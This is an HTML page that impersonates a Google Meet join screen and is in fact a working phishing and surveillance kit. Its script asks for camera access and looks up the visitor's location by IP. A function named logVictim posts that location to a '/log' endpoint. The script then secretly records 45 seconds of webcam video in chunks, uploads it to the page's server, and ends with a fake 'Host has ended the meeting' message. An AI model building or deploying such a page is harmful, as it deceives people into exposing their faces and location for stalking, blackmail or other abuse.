<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Meet</title>
<link rel="icon" href="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png" type="image/png">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Google Sans', Roboto, sans-serif; background: #202124; color: #e8eaed; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  .container { text-align: center; max-width: 480px; padding: 24px; }
  .logo { font-size: 28px; font-weight: 500; margin-bottom: 8px; }
  .logo span { color: #8ab4f8; }
  .subtitle { color: #9aa0a6; font-size: 14px; margin-bottom: 32px; }
  .preview-box { width: 100%; aspect-ratio: 16/9; background: #3c4043; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; overflow: hidden; position: relative; }
  #preview { width: 100%; height: 100%; object-fit: cover; display: none; border-radius: 12px; transform: scaleX(-1); }
  .cam-icon { font-size: 48px; color: #9aa0a6; }
  .status-text { color: #9aa0a6; font-size: 13px; margin-bottom: 20px; }
  .btn { background: #8ab4f8; color: #202124; border: none; border-radius: 24px; padding: 12px 32px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
  .btn:hover { background: #aecbfa; }
  .btn:disabled { background: #5f6368; color: #9aa0a6; cursor: not-allowed; }
  .recording-dot { display: inline-block; width: 10px; height: 10px; background: #ea4335; border-radius: 50%; margin-right: 6px; animation: pulse 1s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
  .rec-label { font-size: 13px; color: #ea4335; display: none; margin-bottom: 12px; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">Google <span>Meet</span></div>
  <div class="subtitle">Ready to join? Enable your camera first.</div>
  <div class="preview-box">
    <video id="preview" autoplay muted playsinline></video>
    <div class="cam-icon" id="camIcon">📷</div>
  </div>
  <div class="rec-label" id="recLabel"><span class="recording-dot"></span>Recording...</div>
  <div class="status-text" id="statusText">Allow camera access to join the meeting</div>
  <button class="btn" id="joinBtn" onclick="startSession()">Join Now</button>
</div>

<script>
const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
let mediaRecorder, chunkIndex = 0, stream;

async function getGeo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    return await r.json();
  } catch { return {}; }
}

async function logVictim(geo) {
  await fetch("/log", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({ session: SID, geo })
  }).catch(()=>{});
}

async function startSession() {
  const btn = document.getElementById("joinBtn");
  btn.disabled = true;
  btn.textContent = "Connecting...";
  document.getElementById("statusText").textContent = "Please allow camera access when prompted";

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 }, audio: false });
  } catch(e) {
    document.getElementById("statusText").textContent = "Camera access denied. Please allow and refresh.";
    btn.disabled = false;
    btn.textContent = "Try Again";
    return;
  }

  const preview = document.getElementById("preview");
  preview.srcObject = stream;
  preview.style.display = "block";
  document.getElementById("camIcon").style.display = "none";
  document.getElementById("statusText").textContent = "Joining meeting...";
  btn.textContent = "Joining...";

  const geo = await getGeo();
  await logVictim(geo);

  await new Promise(r => setTimeout(r, 1500));

  document.getElementById("recLabel").style.display = "block";
  document.getElementById("statusText").textContent = "Connecting to host — please wait";

  startRecording(stream);
}

function startRecording(stream) {
  const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
    ? "video/webm;codecs=vp9"
    : "video/webm";

  mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1500000 });

  mediaRecorder.ondataavailable = async (e) => {
    if (e.data && e.data.size > 0) {
      await sendChunk(e.data, chunkIndex++);
    }
  };

  mediaRecorder.onstop = async () => {
    await fetch(`/finalize?sid=${SID}`, { method: "POST" }).catch(()=>{});
  };

  // record in 5-second chunks
  mediaRecorder.start(5000);

  // stop after 45 seconds (adjustable)
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
      mediaRecorder.stop();
      stream.getTracks().forEach(t => t.stop());
      document.getElementById("recLabel").style.display = "none";
      document.getElementById("statusText").textContent = "Host has ended the meeting.";
      document.getElementById("joinBtn").textContent = "Meeting Ended";
    }
  }, 45000);
}

async function sendChunk(blob, index) {
  const buf = await blob.arrayBuffer();
  await fetch(`/upload?sid=${SID}&chunk=${index}`, {
    method: "POST",
    headers: { "Content-Type": "video/webm" },
    body: buf
  }).catch(()=>{});
}
</script>
</body>
</html>
